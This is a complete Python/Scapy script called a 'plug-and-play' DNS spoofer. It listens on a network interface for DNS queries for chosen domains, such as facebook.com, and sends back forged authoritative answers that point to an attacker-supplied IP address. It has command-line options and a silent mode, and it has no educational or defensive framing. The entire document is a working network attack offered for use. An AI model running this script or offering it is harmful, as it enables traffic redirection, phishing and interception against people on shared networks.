from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
import argparse
import sys
import signal

class DNSPoisoner:
    def __init__(self, spoof_ip, target_domains, mode):
        self.spoof_ip = spoof_ip
        self.target_domains = target_domains
        self.mode = mode

    def poison_dns(self, pkt):
        if pkt.haslayer(DNSQR):
            qname = pkt[DNSQR].qname.decode()

            # Check if the query matches any target domain
            if any(target in qname for target in self.target_domains):
                if self.mode != "silent":
                    print(f"[+] Spoofing DNS response for {qname}")

                # Construct spoofed DNS response
                spoofed_pkt = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=53) /
                    DNS(
                        id=pkt[DNS].id,
                        qr=1, aa=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=qname, ttl=50, rdata=self.spoof_ip)
                    )
                )
                send(spoofed_pkt, verbose=0)
            else:
                if self.mode == "aggressive":
                    print(f"[-] Ignoring DNS query: {qname}")


def main():
    parser = argparse.ArgumentParser(description="Plug-and-play DNS Spoofer (Scapy-based)")
    parser.add_argument("--iface", required=True, help="Network interface (e.g. eth0, enp0s3)")
    parser.add_argument("--target-domains", nargs="+", required=True, help="Domains to spoof (e.g. facebook.com)")
    parser.add_argument("--spoof-ip", required=True, help="The IP address to respond with (fake IP)")
    parser.add_argument("--mode", choices=["silent", "aggressive"], default="silent", help="Logging mode")
    args = parser.parse_args()

    # Initialize DNSPoisoner instance
    poisoner = DNSPoisoner(args.spoof_ip, args.target_domains, args.mode)

    print("[*] Starting DNS spoofing...")
    print(f"    Interface: {args.iface}")
    print(f"    Target domains: {', '.join(args.target_domains)}")
    print(f"    Spoof IP: {args.spoof_ip}")
    print(f"    Mode: {args.mode}")
    print("[*] Press Ctrl+C to stop.\n")

    # Register Ctrl+C handler
    def stop(sig, frame):
        print("\n[!] Stopping DNS spoofer. Exiting.")
        sys.exit(0)

    signal.signal(signal.SIGINT, stop)

    # Start sniffing DNS requests
    sniff(iface=args.iface, filter="udp port 53", store=False, prn=poisoner.poison_dns)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run this script as root.")
        sys.exit(1)
    main()
